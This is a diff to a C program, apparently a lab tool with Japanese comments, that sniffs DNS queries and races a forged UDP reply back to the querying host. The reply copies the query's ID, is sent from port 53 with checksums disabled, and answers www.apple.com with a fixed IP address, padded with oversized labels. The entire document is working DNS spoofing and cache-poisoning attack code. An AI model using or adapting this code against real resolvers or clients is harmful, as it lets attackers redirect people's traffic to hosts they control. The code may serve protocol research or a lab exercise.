@@ -22,7 +22,9 @@
 #endif
 
 #define DNS_port 53
-#define MAX_PAYLOAD 1186
+//#define MAX_PAYLOAD 1059
+#define MAX_PAYLOAD 1119
+int flags = 0;
 struct  dnshdr{
 	u_int16_t id;
 	u_int16_t flags;
@@ -125,25 +127,27 @@ struct tcphdr	*tcphdr;
 }
 int GenerateLabel(char *payload){
 	int i;
-	char s[192];
+	char s[64];
 
-	s[0] = '\xBF';
-	for(i = 1; i < 192; i++){
+	s[0] = 63;
+	for(i = 1; i < 64; i++){
 		s[i] = 'a';
 	}
-	for(i = 0; i < 6; i++){
-		memcpy(payload+i*192,s,192);
+	for(i = 0; i < 16; i++){
+		memcpy(payload+i*64,s,64);
 	}
 	return 0;
 }
-int SendDNSPacket(u_int16_t DNSid){
+int SendDNSPacket(u_int16_t DNSid,u_int16_t dest){
 	int sock;
-	struct sockaddr_in addr;
+	struct sockaddr_in addr,srcaddr;
 	int disable = 1;
-	//char payload[MAX_PAYLOAD]; //= "//ラベルの始まり\x03\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00//ここまでがラベル\x00\x01\x00\x01\x00\x00\x00\x0a\x00\x04\x4a\x7d\xeb\x92";
-	char qd[] = "\x03\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01";
-	char an_[] = "\x00\x00\x01\x00\x01\x00\x00\x00\x0a\x00\x04\x4a\x7d\xeb\x92";
-
+	//char qd[] = "\x03\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01";
+	char qd[] = "\x3f\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01";
+	char qd_aaaa[] = "\x3f\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x1c\x00\x01";
+	//char qd_aaaa[] = "\x03\x77\x77\x77\x05\x61\x70\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x1c\x00\x01";
+	//char an_[] = "\x00\x00\x01\x00\x01\x00\x00\x00\x0a\x00\x04\xd8\x3a\xc5\xa3";
+	char an_[] = "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x0a\x00\x04\xd8\x3a\xc5\xa3";
 	
 	//パケット生成
 	fprintf(stdout,"TEST DNSPacket ID is %X\n",ntohs(DNSid));
@@ -156,25 +160,46 @@ int SendDNSPacket(u_int16_t DNSid){
 	sendhdr.nscount = 0;
 	sendhdr.arcount = 0;
 	send.hdr = sendhdr;
-	memcpy(send.payload,qd,sizeof(qd));
+	if(flags == 0){
+		memcpy(send.payload,qd,sizeof(qd));
+		flags = 1;
+	}
+	else{
+		memcpy(send.payload,qd_aaaa,sizeof(qd_aaaa));
+		flags = 0;
+	}
 	GenerateLabel(send.payload+sizeof(qd)-1);
-	memcpy(send.payload+1152+sizeof(qd)-1,an_,sizeof(an_));
+	memcpy(send.payload+1024+sizeof(qd)-1,an_,sizeof(an_));
 	
-	//送信
+	//ソケット作成、設定
 	sock = socket(AF_INET, SOCK_DGRAM, 0);
 	if (setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, (void*)&disable, sizeof(disable)) < 0) {
 		perror("setsockopt failed");
 	}
+	//送信先の設定
 	addr.sin_family = AF_INET;
-	addr.sin_port = htons(53);
-	addr.sin_addr.s_addr = inet_addr("192.168.11.7");
-	sendto(sock, &send, sizeof(struct dnspacket_test), 0, (struct sockaddr *)&addr, sizeof(addr));
+	printf("%u\n",ntohs(dest));
+	addr.sin_port = dest;
+	addr.sin_addr.s_addr = inet_addr("192.168.11.15");
+	//送信元の設定
+	srcaddr.sin_family = AF_INET;
+    srcaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    srcaddr.sin_port = htons(53);
+	//送信
+	if (bind(sock, (struct sockaddr *) &srcaddr, sizeof(srcaddr)) < 0) {
+        perror("bind");
+        return -1;
+    }
+	if(send.payload[MAX_PAYLOAD-1] != '\x00')
+		sendto(sock, &send, sizeof(struct dnspacket_test), 0, (struct sockaddr *)&addr, sizeof(addr));
+	else
+		sendto(sock, &send, sizeof(struct dnspacket_test)-1, 0, (struct sockaddr *)&addr, sizeof(addr));
 	printf("OK\n");
 	close(sock);
 	return 0;
 }
 
-int AnalyzeDNS(u_char *data, int size){
+int AnalyzeDNS(u_char *data, int size,u_int16_t dest){
 	u_char *ptr;
 	int lest;
 	struct dnshdr *hdr;
@@ -189,7 +214,7 @@ int AnalyzeDNS(u_char *data, int size){
 	lest -= sizeof(struct dnshdr);
 	
 	fprintf(stdout,"DNSPacket ID is %X\n",ntohs(hdr->id));
-	SendDNSPacket(hdr->id);
+	SendDNSPacket(hdr->id,dest);
 	return(0);
 }
 
@@ -212,7 +237,7 @@ struct udphdr	*udphdr;
 	lest-=sizeof(struct udphdr);
 
 	if(ntohs(udphdr->dest) == DNS_port){
-		AnalyzeDNS(ptr,lest);
+		AnalyzeDNS(ptr,lest,udphdr->source);
 	}
 	//PrintUdp(udphdr,stdout);	
 
